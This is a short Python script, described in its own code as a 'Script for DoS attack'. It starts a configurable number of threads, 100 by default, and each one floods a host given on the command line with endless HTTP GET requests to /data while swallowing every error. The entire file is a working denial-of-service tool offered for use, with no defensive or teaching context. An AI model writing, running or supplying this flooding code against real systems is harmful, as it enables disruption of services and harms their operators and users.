import argparse
import requests
import threading

def attack(host):
    while True:
        try:
            response = requests.get(f"http://{host}/data")
        except:
            continue

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Script for DoS attack')
    parser.add_argument('--host', dest='host', action='store', required=True)
    parser.add_argument('--threads', dest='threads', action='store', default=100)
    args = parser.parse_args()

    for i in range(int(args.threads)):
        threading.Thread(target=attack, args=(args.host,)).start()